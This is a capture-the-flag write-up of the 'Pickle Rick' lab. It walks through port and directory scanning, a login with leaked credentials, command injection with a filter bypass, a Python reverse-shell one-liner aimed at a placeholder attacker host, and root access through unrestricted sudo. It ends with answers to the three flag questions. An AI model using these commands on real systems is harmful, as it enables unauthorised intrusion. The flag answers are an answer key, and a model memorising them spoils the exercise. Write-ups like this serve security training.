# Pickle Rick

```json
export ip=10.10.58.138
```

```
first step is to always run the nmap scans

nmap -p 0-9999 -oN scans/nmap_high_ports $ip
nmap -sC -sV -oN scans/nmap_normal $ip
```
```
looks like we have apache [80](webserver), ftp [21] and ssh [2222]running
```
```
we can see theres a robots.txt file which contains
"Wubbalubbadubdub" possibly a password?
```
```
always run gobuster after seeing apache is running and open

gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt +x php,sh,txt,cgi,html,js,css,py
```

```
if we view the page source of the webserver we can see rick has left a username for us
"Note to self, remember username!

    Username: R1ckRul3s"
```
```
if we go to /login.php we can try the username and password we possibly found
great it worked and it looks like we can execute commands from here
```
```
if we run ls we get 
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

and it seems using cat is disabled
we need to find a way around that
lets try using "nl Sup3rS3cretPickl3Ingred.txt"
"mr. meeseek hair"
perfect
```
# 1. What is the first ingredient Rick needs?
```
answer: mr. meeseek hair 
```
```
lets see what clue.txt is
"Look around the file system for the other ingredient."
it looks like we can only run one liners however using the ; sign we can run multiple commands in one line

if we view the page source it looks like we have a base64 encoded string lets decode it
nothing useful there either
```
```
suppose we should try getting a shell however netcat is disabled
python on the other hand is working so lets get a python reverse shell
```
```json
export RHOST="YOUR_IP";export RPORT=YOUR_PORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

nc -lvnp YOUR_PORT (listener)
```
```
we now have a shell lets go look around
if we go to /home/rick and cat "second ingredient"
we find our second ingredient 
"1 jerry tear"
```
# 2. What is the second ingredient Rick needs?
```
answer: 1 jerry tear
```
```
im going to assume the last ingredient is probably in /root or needs root access so lets upgrade our shell so we can privesc to root
```
```json
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z 
stty raw -echo
fg
```
always the first thing to do when your looking to privesc is to run sudo -l
in this cane we can sudo without a password on everything
so lets try running sudo "/bin/bash"
```
```
great we are now root! we can see that with id, whoami etc
so lets look around for the final ingredient
```
```
the final ingredient is /root/3rd.txt which we can use cat or nl to see what it is
1 fleeb juice
```
```
# 3. What is the third ingredient Rick needs?
```
answer: 1 fleeb juice
```

```json
Congratulations on completeing the room !
```
